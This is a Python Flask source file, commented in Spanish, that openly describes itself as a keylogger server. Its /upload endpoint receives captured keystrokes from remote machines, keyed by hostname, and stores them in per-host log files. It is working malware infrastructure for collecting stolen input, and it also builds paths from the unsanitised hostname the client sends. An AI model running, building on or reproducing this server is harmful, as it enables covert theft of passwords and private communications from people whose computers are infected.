from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

UPLOAD_FOLDER = './uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return "Servidor de keylogger activo."

@app.route('/upload', methods=['POST'])
def upload_file():
    data = request.json  # Obtener los datos en formato JSON
    if not data or 'hostname' not in data or 'data' not in data:
        return jsonify({"error": "Datos inválidos"}), 400

    hostname = data['hostname']
    palabras = data['data']

    # Crear una carpeta para el PC si no existe
    hostname_folder = os.path.join(UPLOAD_FOLDER, hostname)
    os.makedirs(hostname_folder, exist_ok=True)

    # Guardar las palabras en un archivo específico para el PC
    file_path = os.path.join(hostname_folder, f"{hostname}_log.txt")
    with open(file_path, "a") as file:
        file.write(f"{datetime.now()}: {palabras}\n")

    return jsonify({"message": "Datos recibidos correctamente"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))